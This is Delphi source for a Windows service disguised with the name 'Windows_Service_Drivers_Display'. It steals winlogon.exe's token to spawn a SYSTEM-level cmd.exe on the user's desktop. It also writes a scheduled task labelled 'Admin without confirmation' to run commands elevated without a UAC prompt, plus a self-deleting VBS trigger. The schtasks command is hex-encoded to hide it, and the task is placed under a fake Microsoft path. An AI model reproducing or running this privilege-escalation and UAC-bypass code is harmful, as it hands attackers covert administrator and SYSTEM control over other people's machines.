unit Unit1;
interface
uses
   Vcl.SvcMgr;

type
  DWORD = LongWord;
  ULONG_PTR = NativeUInt;
  BOOL = LongBool;
  WCHAR = WideChar;
  THandle = System.THandle;
  PHandle = ^THandle;
  LPCWSTR = PWideChar;
  LPCSTR = MarshaledAString;
  FARPROC = Pointer;
  LPWSTR = PWideChar;
  LPSTR = MarshaledAString;
  TSecurityImpersonationLevel = (SecurityAnonymous, SecurityIdentification, SecurityImpersonation, SecurityDelegation);
  TTokenType = (TokenTPad, TokenPrimary, TokenImpersonation);

const
  kernel32 = 'kernel32.dll';
  advapi32 = 'advapi32.dll';
  wtsapi32 = 'wtsapi32.dll';
  userenv = 'userenv.dll';
  MAX_MODULE_NAME32 = 255;
  TH32CS_SNAPPROCESS  = $00000002;
  MAX_PATH = 260;
  TOKEN_ADJUST_PRIVILEGES = $0020;
  MAXIMUM_ALLOWED = $02000000;
  NORMAL_PRIORITY_CLASS = $00000020;
  STANDARD_RIGHTS_REQUIRED = $000F0000;
  SYNCHRONIZE = $00100000;
  PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED or SYNCHRONIZE or $FFFF);
  CREATE_UNICODE_ENVIRONMENT = $00000400;
  TOKEN_QUERY = $0008;
  STANDARD_RIGHTS_EXECUTE  = $00020000;
  TOKEN_EXECUTE = STANDARD_RIGHTS_EXECUTE;
  procedure ZeroMemory(Destination: Pointer; Length: NativeUInt); inline;

type
  TWindows_Service_Drivers_Display = class(TService)
    procedure ServiceContinue(Sender: TService; var Continued: Boolean);
    procedure ServicePause(Sender: TService; var Paused: Boolean);
    procedure ServiceStart(Sender: TService; var Started: Boolean);
    procedure ServiceStop(Sender: TService; var Stopped: Boolean);
  private
  public
    function GetServiceController: TServiceController; override;
  end;

type
  tagPROCESSENTRY32A = record
    dwSize: DWORD;
    cntUsage: DWORD;
    th32ProcessID: DWORD;
    th32DefaultHeapID: ULONG_PTR;
    th32ModuleID: DWORD;
    cntThreads: DWORD;
    th32ParentProcessID: DWORD;
    pcPriClassBase: Longint;
    dwFlags: DWORD;
    szExeFile: array[0..MAX_PATH - 1] of AnsiChar;
  end;
  PROCESSENTRY32A = tagPROCESSENTRY32A;
  PPROCESSENTRY32A = ^tagPROCESSENTRY32A;
  LPPROCESSENTRY32A = ^tagPROCESSENTRY32A;
  TProcessEntry32A = tagPROCESSENTRY32A;

function Process32FirstA(hSnapshot: THandle; var lppe: TProcessEntry32A): BOOL;
function Process32NextA(hSnapshot: THandle; var lppe: TProcessEntry32A): BOOL;

type
  TProcess32FirstA = function (hSnapshot: THandle; var lppe: TProcessEntry32A): BOOL stdcall;
  TProcess32NextA = function (hSnapshot: THandle; var lppe: TProcessEntry32A): BOOL stdcall;
  tagPROCESSENTRY32W = record
    dwSize: DWORD;
    cntUsage: DWORD;
    th32ProcessID: DWORD;
    th32DefaultHeapID: ULONG_PTR;
    th32ModuleID: DWORD;
    cntThreads: DWORD;
    th32ParentProcessID: DWORD;
    pcPriClassBase: Longint;
    dwFlags: DWORD;
    szExeFile: array[0..MAX_PATH - 1] of WChar;// Path
  end;
  PROCESSENTRY32W = tagPROCESSENTRY32W;
  PPROCESSENTRY32W = ^tagPROCESSENTRY32W;
  LPPROCESSENTRY32W = ^tagPROCESSENTRY32W;
  TProcessEntry32W = tagPROCESSENTRY32W;

function Process32FirstW(hSnapshot: THandle; var lppe: TProcessEntry32W): BOOL;
function Process32NextW(hSnapshot: THandle; var lppe: TProcessEntry32W): BOOL;

type
  TProcess32FirstW = function (hSnapshot: THandle; var lppe: TProcessEntry32W): BOOL stdcall;
  TProcess32NextW = function (hSnapshot: THandle; var lppe: TProcessEntry32W): BOOL stdcall;

{$IFDEF UNICODE}
  tagPROCESSENTRY32 = tagPROCESSENTRY32W;
  PROCESSENTRY32 = tagPROCESSENTRY32W;
  PPROCESSENTRY32 = ^tagPROCESSENTRY32W;
  LPPROCESSENTRY32 = ^tagPROCESSENTRY32W;
  TProcessEntry32 = tagPROCESSENTRY32W;
  TProcess32First = TProcess32FirstW;
  TProcess32Next = TProcess32NextW;
{$ELSE}
  tagPROCESSENTRY32 = tagPROCESSENTRY32A;
  PROCESSENTRY32 = tagPROCESSENTRY32A;
  PPROCESSENTRY32 = ^tagPROCESSENTRY32A;
  LPPROCESSENTRY32 = ^tagPROCESSENTRY32A;
  TProcessEntry32 = tagPROCESSENTRY32A;
  TProcess32First = TProcess32FirstA;
  TProcess32Next = TProcess32NextA;
{$ENDIF}

function Process32First(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL;
function Process32Next(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL;
function CreateToolhelp32Snapshot(dwFlags, th32ProcessID: DWORD): THandle;

type
  TCreateToolhelp32Snapshot = function (dwFlags, th32ProcessID: DWORD): THandle stdcall;

type
  PStartupInfoA = ^TStartupInfoA;
  PStartupInfoW = ^TStartupInfoW;
  PStartupInfo = PStartupInfoW;
  _STARTUPINFOA = record
    cb: DWORD;
    lpReserved: LPSTR;
    lpDesktop: LPSTR;
    lpTitle: LPSTR;
    dwX: DWORD;
    dwY: DWORD;
    dwXSize: DWORD;
    dwYSize: DWORD;
    dwXCountChars: DWORD;
    dwYCountChars: DWORD;
    dwFillAttribute: DWORD;
    dwFlags: DWORD;
    wShowWindow: Word;
    cbReserved2: Word;
    lpReserved2: PByte;
    hStdInput: THandle;
    hStdOutput: THandle;
    hStdError: THandle;
  end;
  _STARTUPINFOW = record
    cb: DWORD;
    lpReserved: LPWSTR;
    lpDesktop: LPWSTR;
    lpTitle: LPWSTR;
    dwX: DWORD;
    dwY: DWORD;
    dwXSize: DWORD;
    dwYSize: DWORD;
    dwXCountChars: DWORD;
    dwYCountChars: DWORD;
    dwFillAttribute: DWORD;
    dwFlags: DWORD;
    wShowWindow: Word;
    cbReserved2: Word;
    lpReserved2: PByte;
    hStdInput: THandle;
    hStdOutput: THandle;
    hStdError: THandle;
  end;
  _STARTUPINFO = _STARTUPINFOW;
  TStartupInfoA = _STARTUPINFOA;
  TStartupInfoW = _STARTUPINFOW;
  TStartupInfo = TStartupInfoW;
  STARTUPINFOA = _STARTUPINFOA;
  STARTUPINFOW = _STARTUPINFOW;
  STARTUPINFO = STARTUPINFOW;

type
   PSecurityAttributes = ^TSecurityAttributes;
  _SECURITY_ATTRIBUTES = record
    nLength: DWORD;
    lpSecurityDescriptor: Pointer;
    bInheritHandle: BOOL;
  end;
  TSecurityAttributes = _SECURITY_ATTRIBUTES;
  SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES;

type
    PProcessInformation = ^TProcessInformation;
  _PROCESS_INFORMATION = record
    hProcess: THandle;
    hThread: THandle;
    dwProcessId: DWORD;
    dwThreadId: DWORD;
  end;
  TProcessInformation = _PROCESS_INFORMATION;
  PROCESS_INFORMATION = _PROCESS_INFORMATION;

var
  Windows_Service_Drivers_Display: TWindows_Service_Drivers_Display;
  KernelHandle: THandle;
  _CreateToolhelp32Snapshot: TCreateToolhelp32Snapshot;
  _Process32First: TProcess32First;
  _Process32Next: TProcess32Next;
  _Process32FirstA: TProcess32FirstA;
  _Process32NextA: TProcess32NextA;
  _Process32FirstW: TProcess32FirstW;
  _Process32NextW: TProcess32NextW;

implementation
{$R *.dfm}

//========================================================================
function WTSQueryUserToken(SessionId: DWORD; phToken: pHandle):bool;stdcall;
external wtsapi32 name 'WTSQueryUserToken';
//========================================================================
function CreateEnvironmentBlock(var lpEnvironment: Pointer; hToken: THandle;bInherit: BOOL): BOOL;stdcall;
external userenv name 'CreateEnvironmentBlock';
//========================================================================
function DestroyEnvironmentBlock(pEnvironment: Pointer): BOOL; stdcall;
external userenv name 'DestroyEnvironmentBlock';
//========================================================================
function GetModuleHandle(lpModuleName: LPCWSTR): HMODULE; stdcall;
external kernel32 name 'GetModuleHandleW';
//========================================================================
function GetProcAddress(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
external kernel32 name 'GetProcAddress';
//========================================================================
function CloseHandle(hObject: THandle): BOOL; stdcall;
external kernel32 name 'CloseHandle';
//========================================================================
function CreateProcessAsUserW(hToken: THandle; lpApplicationName: LPCWSTR;
lpCommandLine: LPWSTR; lpProcessAttributes: PSecurityAttributes;
lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL;
dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: LPCWSTR;
const lpStartupInfo: TStartupInfoW; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
external advapi32 name 'CreateProcessAsUserW';
//========================================================================
function OpenProcess(dwDesiredAccess: DWORD; bInheritHandle: BOOL; dwProcessId: DWORD): THandle; stdcall;
external kernel32 name 'OpenProcess';
//========================================================================
function WTSGetActiveConsoleSessionId: DWORD; stdcall;
external kernel32 name 'WTSGetActiveConsoleSessionId';
//========================================================================
function GetCurrentProcess: THandle; stdcall;
external kernel32 name 'GetCurrentProcess';
//========================================================================
function OpenProcessToken(ProcessHandle: THandle; DesiredAccess: DWORD;
  var TokenHandle: THandle): BOOL; stdcall;
external advapi32 name 'OpenProcessToken';
//========================================================================
function DuplicateTokenEx(hExistingToken: THandle; dwDesiredAccess: DWORD;
lpTokenAttributes: PSecurityAttributes;
ImpersonationLevel: TSecurityImpersonationLevel; TokenType: TTokenType;
var phNewToken: THandle): BOOL; stdcall;
external advapi32 name 'DuplicateTokenEx';
//========================================================================
function CreateProcessAsUser(hToken: THandle; lpApplicationName: LPCWSTR;
lpCommandLine: LPWSTR; lpProcessAttributes: PSecurityAttributes;
lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL;
dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: LPCWSTR;
const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;
external advapi32 name 'CreateProcessAsUserW';
//========================================================================

procedure ZeroMemory(Destination: Pointer; Length: NativeUInt);
begin
  FillChar(Destination^, Length, 0);
end;

function ExtractFileName(Str:String):String;
var
i, j:Integer;
ostr:String;
begin
j := Length(Str);
for i := j downto 1 do
if Str[i] <> '\' then
ostr := Str[i] + ostr
else Break;
Result := ostr;
end;

function ExtractFilePath(Str:String):String;
var
i, j:Integer;
ostr:String;
b:Boolean;
begin
b:=False;
j := Length(Str);
for i := j downto 1 do
begin
if Str[i] = '\' then
b:=True;
if b = True then
ostr := Str[i] + ostr;
end;
Result := ostr;
end;

function StrPas(const Str: PWideChar): UnicodeString;
begin
  Result := Str;
end;

function UpperCase(const S: string): string;
var
  I, Len: Integer;
  DstP, SrcP: PChar;
  Ch: Char;
begin
  Len := Length(S);
  SetLength(Result, Len);
  if Len > 0 then
  begin
    DstP := PChar(Pointer(Result));
    SrcP := PChar(Pointer(S));
    for I := Len downto 1 do
    begin
      Ch := SrcP^;
      case Ch of
        'a'..'z':
          Ch := Char(Word(Ch) xor $0020);
      end;
      DstP^ := Ch;
      Inc(DstP);
      Inc(SrcP);
    end;
  end;
end;

 function InitToolHelp: Boolean;
begin
  if KernelHandle = 0 then
  begin
    KernelHandle := GetModuleHandle(kernel32);
    if KernelHandle <> 0 then
    begin
      @_CreateToolhelp32Snapshot := GetProcAddress(KernelHandle, 'CreateToolhelp32Snapshot');
      @_Process32FirstA := GetProcAddress(KernelHandle, 'Process32First');
      @_Process32NextA := GetProcAddress(KernelHandle, 'Process32Next');
      @_Process32FirstW := GetProcAddress(KernelHandle, 'Process32FirstW');
      @_Process32NextW := GetProcAddress(KernelHandle, 'Process32NextW');
{$IFDEF UNICODE}
      @_Process32First := GetProcAddress(KernelHandle, 'Process32FirstW');
      @_Process32Next := GetProcAddress(KernelHandle, 'Process32NextW');
{$ELSE}
      @_Process32First := GetProcAddress(KernelHandle, 'Process32First');
      @_Process32Next := GetProcAddress(KernelHandle, 'Process32Next');
{$ENDIF}
    end;
  end;
  Result := (KernelHandle <> 0) and Assigned(_CreateToolhelp32Snapshot);
end;

function CreateToolhelp32Snapshot;
begin
  if InitToolHelp then
    Result := _CreateToolhelp32Snapshot(dwFlags, th32ProcessID)
  else Result := 0;
end;

function Process32First;
begin
  if InitToolHelp then
    Result := _Process32First(hSnapshot, lppe)
  else Result := False;
end;

function Process32Next;
begin
  if InitToolHelp then
    Result := _Process32Next(hSnapshot, lppe)
  else Result := False;
end;

function Process32FirstA;
begin
  if InitToolHelp then
    Result := _Process32FirstA(hSnapshot, lppe)
  else Result := False;
end;

function Process32NextA;
begin
  if InitToolHelp then
    Result := _Process32NextA(hSnapshot, lppe)
  else Result := False;
end;

function Process32FirstW;
begin
  if InitToolHelp then
    Result := _Process32FirstW(hSnapshot, lppe)
  else Result := False;
end;

function Process32NextW;
begin
  if InitToolHelp then
    Result := _Process32NextW(hSnapshot, lppe)
  else Result := False;
end;

function StrToInt(const S: string): Integer;
var E: Integer;
begin
Val(S, Result,E);
end;

function HexArrToStr(const hexarr:array of string): Ansistring;
var
 i:Integer;
function HexToStr(hex: Ansistring): Ansistring;
var
i: Integer;
begin
for i:= 1 to Length(hex) div 2 do
begin
Result:= Result + AnsiChar(StrToInt('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
end;
end;
begin
 for i:= 0 to Length(hexarr)-1 do
 begin
 Result :=  HexToStr(AnsiString(hexarr[i]));
 end;
end;

function GetPID(IFile: String): DWORD;
var
  IH: THandle;
  IPE: TProcessEntry32;
begin
  Result := 0;
  IFile := UpperCase(IFile);
  IH := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  if IH <> 0 then
    try
      IPE.dwSize := Sizeof(IPE);
      if Process32First(IH, IPE) then
        Repeat
          if Pos(IFile,UpperCase(ExtractFilename(StrPas(IPE.szExeFile)))) > 0 then
          begin
            Result:= IPE.th32ProcessID;
            Break;
          end;
        until not Process32Next(IH, IPE);
    finally
      CloseHandle(IH);
    end;
end;

function CreateProcessAsUserInteractive(IFile,ICommandLine,IDir: PWideChar; IShow: DWORD):Boolean;
var
hToken,hDuplicateToken:THandle;
si: TSTARTUPINFO;
pi: PROCESS_INFORMATION;
begin
  Result := False;
  if OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY or TOKEN_EXECUTE,hToken) then
  begin
    ZeroMemory(@si, SizeOf(si));
    si.cb := SizeOf(si);
    si.lpDesktop := PChar('winsta0\default');
    si.wShowWindow:=IShow;
    if WTSQueryUserToken(WtsGetActiveConsoleSessionID, @hToken) then
      if DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nil, SecurityImpersonation, TokenPrimary, hDuplicateToken) then
          if CreateProcessAsUser(hDuplicateToken, PChar(IFile), PChar(ICommandLine), nil, nil, False,
          NORMAL_PRIORITY_CLASS, nil, IDir, si, pi) = True then Result := True;
    CloseHandle(hToken);
    CloseHandle(hDuplicateToken);
  end;
end;

function CreateProcessAsSystemInteractive(IFile,ICommandLine,IDir: PWideChar):Boolean;
var
  hToken, hUserToken: THandle;
  si: TStartupInfoW;
  pi: TProcessInformation;
  Ip: Pointer;
  pr: Cardinal;
begin
     Result := False;
     pr := GetPID('winlogon.exe');
     ZeroMemory(@si, sizeof(si));
     si.cb := SizeOf(StartupInfo);
     si.lpDesktop := ('winsta0\default');
     si.wShowWindow := 1;
     if WTSQueryUserToken(WtsGetActiveConsoleSessionID, @hUserToken) then
      if OpenProcessToken(OpenProcess(PROCESS_ALL_ACCESS, False,pr),MAXIMUM_ALLOWED,hToken) then
       if CreateEnvironmentBlock(Ip, hUserToken, True) then
        if CreateProcessAsUserW(hToken,IFile,ICommandLine,nil,nil,False,CREATE_UNICODE_ENVIRONMENT,Ip,IDir,si,pi) then
          Result := True;
      CloseHandle(hToken);
      CloseHandle(hUserToken);
      DestroyEnvironmentBlock(Ip);
end;

procedure CreateProcessAsAdminInteractive(IUserName,IFIleCreateProcess,IDir:string);
const
// /c schtasks /create /tn "\Microsoft\XLM\XMLXX" /xml "
Hcom1:Array[0..52] of string=(
'2F','63','20','73','63','68','74','61','73','6B','73','20','2F','63','72',
'65','61','74','65','20','2F','74','6E','20','22','5C','4D','69','63','72',
'6F','73','6F','66','74','5C','58','4C','4D','5C','58','4D','4C','58','58',
'22','20','2F','78','6D','6C','20','22');
// ml.xml" /f&&start vb.vbs&&del ml.xml&&Exit
Hcom2:Array[0..41] of string=(
'6D','6C','2E','78','6D','6C','22','20','2F','66','26','26','73','74','61',
'72','74','20','76','62','2E','76','62','73','26','26','64','65','6C','20',
'6D','6C','2E','78','6D','6C','26','26','45','78','69','74');
var
com1,com2,Pth:string;
var
F: TextFile;
begin
  AssignFile(F,ExtractFilePath(ParamStr(0))+'ml.xml');
  try
    ReWrite(F);
    Writeln(F,'<?xml version="1.0" encoding="UTF-16"?>');
    Writeln(F,'<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">');
    Writeln(F,'<RegistrationInfo>');
    Writeln(F,'<Date>2013-07-24T15:00:52.6087783</Date>');
    Writeln(F,'<Author>'+IUserName+'</Author>');
    Writeln(F,'<Description>Admin without confirmation</Description>');
    Writeln(F,'</RegistrationInfo>');
    Writeln(F,'<Triggers>');
    Writeln(F,'<EventTrigger>');
    Writeln(F,'<Enabled>true</Enabled>');
    Writeln(F,'<Subscription>');
    Writeln(F,'&lt;QueryList&gt;&lt;Query Id="0" Path="Application"&gt;&lt;Select Path="Application"&gt;');
    Writeln(F,'*[System[Provider[@Name=''WSH''] and (Level=4 or Level=0) and (EventID=4)]]');
    Writeln(F,'and');
    Writeln(F,'*[EventData[Data=''C53687254761347652C2CB6767658ABB85546475643255'']]');
    Writeln(F,'&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;');
    Writeln(F,'</Subscription>');
    Writeln(F,'</EventTrigger>');
    Writeln(F,'</Triggers>');
    Writeln(F,'<Principals>');
    Writeln(F,'<Principal id="Author">');
    Writeln(F,'<UserId>'+IUserName+'</UserId>');
    Writeln(F,'<LogonType>InteractiveToken</LogonType>');
    Writeln(F,'<RunLevel>HighestAvailable</RunLevel>');
    Writeln(F,'</Principal>');
    Writeln(F,'</Principals>');
    Writeln(F,'<Settings>');
    Writeln(F,'<MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>');
    Writeln(F,'<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>');
    Writeln(F,'<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>');
    Writeln(F,'<AllowHardTerminate>false</AllowHardTerminate>');
    Writeln(F,'<StartWhenAvailable>false</StartWhenAvailable>');
    Writeln(F,'<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>');
    Writeln(F,'<IdleSettings>');
    Writeln(F,'<StopOnIdleEnd>false</StopOnIdleEnd>');
    Writeln(F,'<RestartOnIdle>false</RestartOnIdle>');
    Writeln(F,'</IdleSettings>');
    Writeln(F,'<AllowStartOnDemand>true</AllowStartOnDemand>');
    Writeln(F,'<Enabled>true</Enabled>');
    Writeln(F,'<Hidden>false</Hidden>');
    Writeln(F,'<RunOnlyIfIdle>false</RunOnlyIfIdle>');
    Writeln(F,'<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>');
    Writeln(F,'<UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>');
    Writeln(F,'<WakeToRun>false</WakeToRun>');
    Writeln(F,'<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>');
    Writeln(F,'<Priority>7</Priority>');
    Writeln(F,'</Settings>');
    Writeln(F,'<Actions Context="Author">');
    Writeln(F,'<Exec>');
    Writeln(F,'<Command>'+IFIleCreateProcess+'</Command>');
    Writeln(F,'<Arguments>-NoLogo -NoExit</Arguments>');
    Writeln(F,'<WorkingDirectory>'+IDir+'</WorkingDirectory>');
    Writeln(F,'</Exec>');
    Writeln(F,'</Actions>');
    Writeln(F,'</Task>');
  finally
    CloseFile(F);
  end;
  AssignFile(F,ExtractFilePath(ParamStr(0))+'vb.vbs');
  try
    ReWrite(F);
    Writeln(F,'Set WshShell = WScript.CreateObject("WScript.Shell")');
    Writeln(F,'WshShell.LogEvent 4, "C53687254761347652C2CB6767658ABB85546475643255"');
    Writeln(F,'discardScript()');
    Writeln(F,'');
    Writeln(F,'Function discardScript()');
    Writeln(F,'    Set objFSO = CreateObject("Scripting.FileSystemObject")');
    Writeln(F,'    strScript = Wscript.ScriptFullName');
    Writeln(F,'    objFSO.DeleteFile(strScript)');
    Writeln(F,'End Function');
  finally
    CloseFile(F);
  end;
  // /c schtasks /create /tn "\Microsoft\XLM\XMLXX" /xml "
  com1 := string(HexArrToStr(HCom1));
  // ml.xml" /f&&start vb.vbs&&del ml.xml&&Exit
  com2 := string(HexArrToStr(HCom2));
  Pth := ExtractFilePath(ParamStr(0));
  CreateProcessAsSystemInteractive(PChar('C:\Windows\System32\cmd.exe'),PChar(com1+Pth+com2),PChar(Pth));
end;

procedure ServiceController(CtrlCode: DWord); stdcall;
begin
  Windows_Service_Drivers_Display.Controller(CtrlCode);
end;

function TWindows_Service_Drivers_Display.GetServiceController: TServiceController;
begin
  Result := ServiceController;
end;

procedure TWindows_Service_Drivers_Display.ServiceContinue(Sender: TService;
  var Continued: Boolean);
begin
Continued := True;
end;

procedure TWindows_Service_Drivers_Display.ServicePause(Sender: TService;
  var Paused: Boolean);
begin
Paused := True;
end;

procedure TWindows_Service_Drivers_Display.ServiceStart(Sender: TService;
  var Started: Boolean);
begin
CreateProcessAsUserInteractive('C:\Windows\System32\cmd.exe','/k whoami','c:\windows\system32',1);
CreateProcessAsSystemInteractive('c:\windows\system32\cmd.exe','/k whoami','c:\windows\system32');
CreateProcessAsAdminInteractive('Home','c:\windows\system32\cmd.exe','c:\windows\system32');
Started := True;
end;

procedure TWindows_Service_Drivers_Display.ServiceStop(Sender: TService;
  var Stopped: Boolean);
begin
Stopped := True;
end;

end.
